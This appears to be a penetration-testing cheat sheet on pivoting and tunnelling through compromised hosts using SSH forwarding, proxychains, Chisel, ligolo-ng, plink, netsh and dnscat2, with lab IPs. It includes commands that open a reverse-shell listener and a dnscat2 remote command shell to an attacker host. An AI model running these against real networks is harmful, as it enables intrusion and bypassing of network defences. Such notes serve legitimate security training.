### Socks
SOCKS5 supports authentication, IPv6, and User Datagram Protocol (UDP), including DNS. Some SOCKS proxies will only support the SOCKS4 protocol. 
### Port Forwarding
###### RINETD
```
cat /etc/rinetd.conf
...
# bindadress    bindport  connectaddress  connectport
0.0.0.0 80 142.0.128.189  22
...
service rinetd start
```
###### SSH local port forwarding
语义：把 本地 Kali (local_kali) 的 8080 端口 → 通过 SSH 隧道 → 转发到 远程主机 (10.129.231.188) 上的 127.0.0.1:8080  

作用：你在本地访问 localhost:8080，实际请求会通过 SSH 隧道跑到远程的 127.0.0.1:8080.  

👉 常见用途:  

访问远程主机或其内网服务（数据库、Web服务）而不需要在远程服务器上暴露端口  
```
kali: ssh -L 8080:127.0.0.1:8080 albert@10.129.231.188
kali: ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
ssh -L local port:server:port user@compromised_host
```
###### ssh remote port forwarding
语义：把 远程主机 (10.129.231.188) 的 8080 端口 → 通过 SSH 隧道 → 转发到 本地 Kali (local_kali) 的 127.0.0.1:8080  

作用：你在远程主机上访问 localhost:8080，实际请求会通过 SSH 隧道跑到你本地 Kali 的 127.0.0.1:8080.  

👉 常见用途:  

让远程机器可以访问你本地运行的服务（例如你本地调试的 Web 服务，远程也能访问到)  
```
kali: ssh -R 8080:127.0.0.1:8080 albert@10.129.231.188
```
###### SSH Dynamic Port Forwarding
Dynamic Port Forwarding:
>The -D argument requests the SSH server to enable dynamic port forwarding. Once we have this enabled, we will require a tool that can route any tool's packets over the port 9050. We can do this using the tool proxychains, which is capable of redirecting TCP connections through TOR, SOCKS, and HTTP/HTTPS proxy servers and also allows us to chain multiple proxy servers together. Using proxychains, we can hide the IP address of the requesting host as well since the receiving host will only see the IP of the pivot host. Proxychains is often used to force an application's TCP traffic to go through hosted proxies like SOCKS4/SOCKS5, TOR, or HTTP/HTTPS proxies.
```
ssh -N -D 9050 ubuntu@10.129.202.64

kali@kali(attacker machine):~$ tail /etc/proxychains4.conf
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 	127.0.0.1 9050
```
###### SSH Remote Dynamic Port Forwarding 
![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/118dc119-bbce-4559-8ec6-5b1c1b7e50f5)

Remote Dynamic Port Forwarding:
initiating an SSH connection from a remote compromised host(confluence to attacker machine)
```
remote compromised machine(confluence01): ssh -N -R 9998 kali@192.168.118.4(attacker machine)(listening state)

kali@kali(attacker machine):~$ tail /etc/proxychains4.conf
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 9998(attacker machine)
```
###### sshuttle
>Sshuttle is another tool written in Python which removes the need to configure proxychains. However, this tool only works for pivoting over SSH and does not provide other options for pivoting over TOR or HTTPS proxy servers.
```
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
```
###### HTTP Tunnel (Chisel)
![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/0c4201e9-44ae-4d2f-ad93-a5ddb4317f52)
```
Chisel Reverse dynamic Port Forwarding:
Confluence01: .\chisel.exe client 192.168.45.214:8080 R:socks
kali(attacker machine): chisel server --port 8080 --reverse/chisel server --port 8080 --socks5 --reverse

proxychains4:
add socks5 127.0.0.1 1080(chisel default port to listen)
disable proxy dns
sudo proxychains4 -f /etc/proxychains4.conf nmap -sS -Pn -p 80 172.16.243.10
```

```
<local-host>:<local-port>:<remote-host>:<remote-port>/<protocol>
which shares <remote-host>:<remote-port> from the server to the client as <local-host>:<local-port>

R:<local-interface>:<local-port>:<remote-host>:<remote-port>/<protocol>
  which does reverse port forwarding, sharing <remote-host>:<remote-port>
  from the client to the server's <local-interface>:<local-port>.

Chisel Reverse Port Forwarding
./chisel server --reverse --port 8080 --socks5.
chisel.exe client <kaliIP>:8080 R:8090:172.16.22.2:8000
Now we can access to http://172.16.22.2:8000/ via localhost:8090

Tip:
Using chisel to do one reverse port forwarding, doesn't have to use proxychains4 
```
###### ligolo-ng
![image](https://github.com/user-attachments/assets/66ad772e-0f66-4a10-b3c3-29e3fbcc9edf)
```
kali: sudo ip tuntap add user kali mode tun ligolo
kali: sudo ip link set ligolo up
kali: ./proxy -selfcert
First Agent:
agent1: agent.exe -connect kali_ip:11601 -ignore-cert
kali: session
kali: 1
kali: ifconfig
kali: sudo ip route add 172.16.0.0/16(second interface) dev ligolo
kali: session;1
kali: start
kali: listener_list
kali: listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444(reverse shell)
kali: listener_list
kali: listener_add --addr 0.0.0.0:1235 --to 0.0.0.0:80(file transfer)
attacker_host: python3 -m http.server 80
172.16.5.35: curl http://172.16.5.15:1235/file -o file
```
### Windows Port forwarding
###### PLINK.exe
```
cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234(dst):127.0.0.1:3306(source) 10.11.0.4
```
###### Netsh
>for this to work, the Windows system must have the IP Helper service running and IPv6 support must be enabled for the interface we want to use
```
netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow
netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
netsh interface portproxy del v4tov4 listenport=4455 listenaddress=10.11.0.22
```
### DNS Tunneling 
Linux server
```
dnscat2-server --dns host=10.10.14.4(attack host),port=53,domain=baidu.com(domain name it will query to)
It will generate a secret
```
Windows Client
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.14.4 -Domain baidu.com -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
```
